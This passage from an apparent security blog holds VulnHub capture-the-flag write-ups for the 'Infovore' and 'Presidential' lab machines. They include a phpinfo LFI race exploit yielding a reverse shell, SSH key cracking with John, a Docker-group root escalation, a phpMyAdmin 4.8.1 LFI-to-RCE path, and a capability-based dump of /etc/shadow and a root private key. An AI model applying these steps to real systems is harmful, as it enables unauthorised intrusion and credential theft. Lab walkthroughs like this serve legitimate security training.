</code></pre></div></div>

<p>Another important thing is when we create the php file in the temporary path it looks like <strong>[tmp_name] =&gt; /tmp/phpidsMp</strong> but in the script look different and this’s a problem <strong>[tmp_name] =&gt; /tmp/phpdsdKs</strong>, we need to change this for the correct operation of the script.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First case:

i = d.find("[tmp_name] =&amp;gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

Second case:

  try:
        i = d.index("[tmp_name] =&amp;gt")
        fn = d[i+17:i+31]
  except ValueError:
        return None
</code></pre></div></div>

<p>Afeter doing this we can execute the script:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2.7 phpinfolfi.py 192.168.1.22 80
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 111432
Spawning worker pool (10)...
  20 /  1000
Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...

</code></pre></div></div>

<p>And we are inside of the machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.22] 54450
www-data@e71b67461f6c:/var/www/html$ whoami
whoami
www-data
www-data@e71b67461f6c:/var/www/html$ 
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>We started with an exhaustive scan of the machine, listing SUID permissions, capabilities, processes etc but found nothing at this point we tried using linPEAS to perform a much more exhaustive scan:</p>

<p>Link: <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">githubLink</a></p>

<p>And we found the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Unexpected in root
/.dockerenv
/core
/.oldkeys.tgz
</code></pre></div></div>

<p>A file old.key.tgz that we unzip and we can see the root ssh keys:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@e71b67461f6c:/dev/shm$ ls
oldkeys.tgz  root  root.pub
www-data@e71b67461f6c:/dev/shm$ file *
oldkeys.tgz: gzip compressed data, last modified: Mon Apr 27 10:18:58 2020, from Unix, original size 10240
root:        PEM DSA private key
root.pub:    OpenSSH DSA public key
www-data@e71b67461f6c:/dev/shm$ cat root
-----BEGIN DSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E

ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb
uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy
gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+
it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe
zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p
fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq
JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT
GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB
t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW
EQDd4Hf9/Ln3w5FThvUf+g==
-----END DSA PRIVATE KEY-----
</code></pre></div></div>

<p>At this point we look for the IP of the real machine and check by sending an empty string to <strong>/dev/tcp</strong> if port 22 is enabled for us to connect.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@e71b67461f6c:/dev/shm$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
192.168.150.1    0x1         0x2         02:42:c6:af:c9:cd     *        eth0
www-data@e71b67461f6c:/dev/shm$ echo '' &gt; /dev/tcp/192.168.150.1/22 &amp;&amp; echo "[+] OPEN" || echo "[-] CLOSSED"
[+] OPEN
www-data@e71b67461f6c:/dev/shm$ echo '' &gt; /dev/tcp/192.168.150.1/21 &amp;&amp; echo "[+] OPEN" || echo "[-] CLOSSED"
bash: connect: Connection refused
bash: /dev/tcp/192.168.150.1/21: Connection refused
[-] CLOSSED
www-data@e71b67461f6c:/dev/shm$ 
</code></pre></div></div>

<p>Before connecting we have to decrypt the private key because it’s encrypted, to do this we have to do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In our machine:
❯ locate ssh2john.py
/usr/share/john/ssh2john.py
❯ python2.7 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt
❯ cat hash.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ id_rsa:$sshng$1$16$2037F380706D4511A1E8D114860D9A0E$448$76ced3d5d2dfc66ee8d0d0bddcf3902cb8e9b538cc305549e2ac4d94ed97b7eac1aa0006ed8401cba4e98f667657165bbb231ed2f33222937d8cd1
       │ e3856cbe36458acc574579d154ddfecee962aae9f211d859d5f4fa631f29fa06f146aa5b28017588ac5294699b25701b5cd0405d5397b127116907d445ba2ce03d84683a0eba2d72a5878a87e2b8d77298fb6537e8adfe
       │ 5157d2962f81351ab31ac374d5cade1b483d3cbe937d2d2a353926798a56c6ded8fbf47ede9c9a4c11c6f2111ecd9717db8aaf5b5298d80ae9492298957670f81c11e422e4e92ffd5255b81a5b3d6112bb265e26cc119d
       │ 693fce5afe97cba309962919aa0b0d841fcee665429869fd36c358db556ca35cecbc4b034236bf3bcc9b2d4299a038849473b0a49ea244a6fd64cd71152427de780d75eb776ee1115f11315abb100bb4a2f2940a8cb386
       │ a70e266d4d56e1c0989773e3e5531914a63bff81f8b34b886266f7feda5451a2f7992ea3116cb48906dc7595a1d60b13f1546d5a8e8eab08049c682b7ac1b7be58b24760af7414f6f9041936566c8de560dac5d260d38a
       │ 3472a3b2889e92149a50133cd2701d11f1f34acdb24961100dde077fdfcb9f7c3915386f51ffa
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

    /media/arc4he/usb_4G/ResolutionOfMachines/Inforvore/content  ✔  with   john -w:/usr/share/wordlists/rockyou.txt hash.txt

❯ john hash.txt --show
id_rsa:choclate93

1 password hash cracked, 0 left
</code></pre></div></div>

<p>When we try to connect via ssh it does not work:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@e71b67461f6c:/dev/shm$ ssh -i root root@192.168.150.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.150.1 (192.168.150.1)' can't be established.
ECDSA key fingerprint is SHA256:47B5q99t6wwHcxTX3Yff0gVrP/Ieun/2T9scPz20xHc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
root@192.168.150.1's password: 
Permission denied, please try again.
root@192.168.150.1's password: 
</code></pre></div></div>

<p>But another thing we can do is try to be root with the cracked password in the docker container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@e71b67461f6c:/dev/shm$ su root
Password: 
root@e71b67461f6c:/dev/shm# whoami
root
root@e71b67461f6c:/dev/shm# 
</code></pre></div></div>

<p>We can get the flag to be root on the docker container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@e71b67461f6c:~# ls
root.txt
root@e71b67461f6c:~# cat root.txt 
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

And onwards and upwards!
root@e71b67461f6c:~# 
</code></pre></div></div>

<p>The next step is to breakout of this container, to do this in the directory <strong>/root/.ssh</strong> we can see the keys to connect via ssh, analysing this key we understand user admin can connect with this container. As a curiosity we try to connect via ssh with admin reusing the password <strong>choclate93</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@e71b67461f6c:~/.ssh# ls
id_rsa	id_rsa.pub  known_hosts
root@e71b67461f6c:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1
root@e71b67461f6c:~/.ssh# 

root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1
Enter passphrase for key '/root/.ssh/id_rsa': 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 16 08:56:12 2024 from 192.168.150.21
admin@infovore:~$ 

</code></pre></div></div>
<p>And it’s work! We can see the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@infovore:~$ ls
admin.txt
admin@infovore:~$ cat admin.txt 
FLAG{Escaped_from_D0ck3r}
admin@infovore:~$ 
</code></pre></div></div>

<p>At this point we have to do a thorough scan again, but one thing that caught my attention is that this machine is using docker and we try to list with the <strong>id</strong> command the groups of the admin user, bingo we found that the admin user is in the docker group</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@infovore:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
admin@infovore:~$ 
</code></pre></div></div>

<p>To become a <strong>ROOT</strong> we have to do the following</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@infovore:~$ docker pull ubuntu:latest
latest: Pulling from library/ubuntu
9c704ecd0c69: Pull complete 
Digest: sha256:2e863c44b718727c860746568e1d54afd13b2fa71b160f5cd9058fc436217b30
Status: Downloaded newer image for ubuntu:latest

admin@infovore:~$ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
864b7ba1b33099324215eb1688053f8a16fb951ea4aaf5b80fa21002e948e364

admin@infovore:~$ docker exec -it privesc bash
root@864b7ba1b330:/# chmod u+s /mnt/root/bin/bash
root@864b7ba1b330:/# exit
exit
</code></pre></div></div>

<p>Now we are <strong>ROOT</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@infovore:~$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt 
 _____                             _       _                                              
/  __ \                           | |     | |                                             
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |                                             
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |                                             
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|                                             
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)                                             
                    __/ |                                                                 
                   |___/                                                                  
__   __                                         _   _        __                         _ 
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |                                                                     
                  |_|                                                                     
 
FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
 
bash-4.3# 
</code></pre></div></div>

<p>Arc4he.</p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="vulnhub" /><category term="web vulnerabilities" /><category term="scripting" /><category term="containers" /><category term="cracking" /><category term="john the ripper" /><category term="ssh" /><category term="phpinfo" /><category term="abusing" /><category term="RCE" /><category term="LFI" /><category term="docker breakout" /><category term="pyhthon" /><summary type="html"><![CDATA[This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins. There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags.]]></summary></entry><entry><title type="html">Presidential - VulnHub</title><link href="http://localhost:4000/vulnhub-Presidential/" rel="alternate" type="text/html" title="Presidential - VulnHub" /><published>2024-08-14T00:00:00-06:00</published><updated>2024-08-14T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub-Presidential</id><content type="html" xml:base="http://localhost:4000/vulnhub-Presidential/"><![CDATA[<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/web_interface.png" alt="" /></p>

<p>The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.</p>

<p>The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.</p>

<h1 id="hack-the-machine">Hack the Machine</h1>

<h2 id="portscan">PortScan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Wed Aug 14 15:55:11 2024 as: nmap -sCV -p80,2082 -oN target 192.168.1.20
Nmap scan report for 192.168.1.20
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
|_http-title: Ontario Election Services &amp;raquo; Vote Now!
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
MAC Address: 00:0C:29:3D:48:E9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 14 15:55:18 2024 -- 1 IP address (1 host up) scanned in 6.88 seconds
</code></pre></div></div>

<h2 id="website">WebSite</h2>

<p><img src="assets/images/2024-08-14-vulnhub-Presidential/web_interface.png" alt="" /></p>

<p>At this point we start scanning the entire website extensively, applying fuzzing to find directories and subdomains.</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/email-votenow.png" alt="" /></p>

<p>Scanning the web we see that there is an e-mail contact@votenow.local, at this point we are interested in adding this domain to our <strong>/etc/hosts</strong> to see if the web changes. =&gt; 192.168.1.20 votenow.local</p>

<h2 id="subdomains-scanning">SubDomains Scanning</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt 20 --append-domain | grep -v "400"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://votenow.local/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: datasafe.votenow.local Status: 200 [Size: 9499]
Progress: 116441 / 141709 (82.17%)^C
</code></pre></div></div>
<p>And we found a important subdomain, at this point we need to edit <strong>/etc/hosts</strong> =&gt; 192.168.1.20 datasafe.votenow.local. This domain <strong>phpmyadmin</strong> is running.</p>

<h2 id="directory-listing">Directory Listing</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://192.168.1.20/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,php.back,bak,back,txt,html,tar,gz -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.20/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.bak,txt,php,bak,back,html,tar,gz,php.back
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/index.html           (Status: 200) [Size: 11713]
/about.html           (Status: 200) [Size: 20194]
/assets               (Status: 301) [Size: 235] [--&gt; http://192.168.1.20/assets/]
/config.php.bak       (Status: 200) [Size: 107]
/config.php           (Status: 200) [Size: 0]
Progress: 26234 / 2205610 (1.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 33874 / 2205610 (1.54%)
</code></pre></div></div>
<p>After some time fuzzing we finally found something. Let’s turn our attention to <strong>config.php.bak</strong> and find credentials:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$dbUser</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>
<span class="nv">$dbPass</span> <span class="o">=</span> <span class="s2">"casoj3FFASPsbyoRP"</span><span class="p">;</span>
<span class="nv">$dbHost</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"votebox"</span><span class="p">;</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>At this point we try these credentials in <strong>phpmyadmin</strong>. And we are in:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/phpmyadmin_interface.png" alt="" />)</p>

<h2 id="scanning-phpmyadmin">Scanning PhpMyAdmin</h2>

<p>In <strong>votebox</strong> data base we can see <strong>users</strong> table and found <strong>admin</strong> user and his password but that password encrypted whit bcrypt. In this point we can crack the password whit John The Ripper:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre></div></div>
<p>This process will take a while, but when it is finished you will find the password:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$2a$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i:Stella
</code></pre></div></div>

<p>After some time performing an exhaustive scan, we see that the phpmyadmin version is ^<strong>4.8.1</strong>. Using searchsploit we can find vulnerabilities:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit phpmyadmin 4.8.1
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                           | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                           | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                        | php/webapps/50457.py
</code></pre></div></div>

<p>We will focus our attention on the <strong>Remote Code Execution (RCE)</strong>. In this case we will not use the exploit to automate everything but we will do manually:</p>

<p>We have to put our session cookie:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_r3i75sdop9i2tgngpd2al9be1rs6mo36
</code></pre></div></div>
<p>Now we can see a lot of information in the phpmyadmin interface:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/information_db.png" alt="" /></p>

<p>What we have to do now is a test using the sql, in order to derive the LFI to a RCE:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/query_test.png" alt="" /></p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/hello_test.png" alt="" /></p>

<p>At this point as we are in a php resource if we now put malicious code php will interpret it:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/revershell.png" alt="" /></p>

<p>Before reloading the page, we must listen on port 443:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
</code></pre></div></div>

<p>And at this point we have already gained access to the machine:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/hacked.png" alt="" /></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<h2 id="tty-tratament">Tty tratament</h2>
<p>The shell we have now is a bit limited, so we are going to perform a TTY (terminal type) treatment:</p>

<p>You have to put <strong>reset xterm</strong> in the screenshot you can not see it:</p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/stty-tratament-1.png" alt="" /></p>

<p><img src="/assets/images/2024-08-14-vulnhub-Presidential/ajustando-tty-2.png" alt="" /></p>

<p>at this point we are going to take advantage of the <strong>admin</strong> user credentials that we have obtained by cracking it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ su admin
Password: 
[admin@votenow phpmyadmin]$ 
</code></pre></div></div>

<h2 id="scanning-the-inside-of-the-machine">Scanning the inside of the machine</h2>

<p>At this point we are already inside the machine. Then we have to perform an exhaustive scan of the machine’s interior to find vulnerabilities and to be able to escalate our privilege. After some time scanning the machine, we found the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow phpmyadmin]$ getcap -r / 2&gt; /dev/null 
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
[admin@votenow phpmyadmin]$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/tarS = cap_dac_read_search+ep
</code></pre></div></div>

<p>The <strong>CAP_DAC_READ_SEARCH+ep</strong> capability allows a process to ignore discretionary access restrictions when reading files and accessing directories. Knowing this what we can try is to make a compressed directory of /etc/shadow to test if it works:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow shm]$ tarS -cvf shadow.tar /etc/shadow
tarS: Removing leading `/' from member names
/etc/shadow
[admin@votenow shm]$ ls
shadow.tar
[admin@votenow shm]$ tar -xf shadow.tar 
[admin@votenow shm]$ cd etc/       
[admin@votenow etc]$ cat shadow 
cat: shadow: Permission denied
[admin@votenow etc]$ chmod 770 shadow 
[admin@votenow etc]$ cat shadow 
root:$6$BvtXLMHn$zoYCSCRbdnaUOb4u3su6of9DDUXeUEe05OOiPIQ5AWo6AB3FWRr/RC3PQ4z.ryqn6o5xS9g4JTKHYI4ek9y541:18440:0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
systemd-network:!!:18440::::::
dbus:!!:18440::::::
polkitd:!!:18440::::::
sshd:!!:18440::::::
postfix:!!:18440::::::
chrony:!!:18440::::::
apache:!!:18440::::::
admin:$6$QeT4IOER$tHg/DAvc5NegomFKFryL5Xe7Od05z7CkYYs9sdRQaQVnJYvsXm2tQljaUhgXVMG8jXaChhhmny6MhD2K5jFXF/:18440:0:99999:7:::
mysql:!!:18440::::::
[admin@votenow etc]$ 
</code></pre></div></div>
<p>And it worked! Now what we are going to do in order to gain access as user root, is the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow etc]$ tarS -cvf ssh.tar /root/.ssh/id_rsa
tarS: Removing leading `/' from member names
/root/.ssh/id_rsa
[admin@votenow etc]$ tarS -xf ssh.tar 
[admin@votenow etc]$ cd root/.ssh/
[admin@votenow .ssh]$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
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
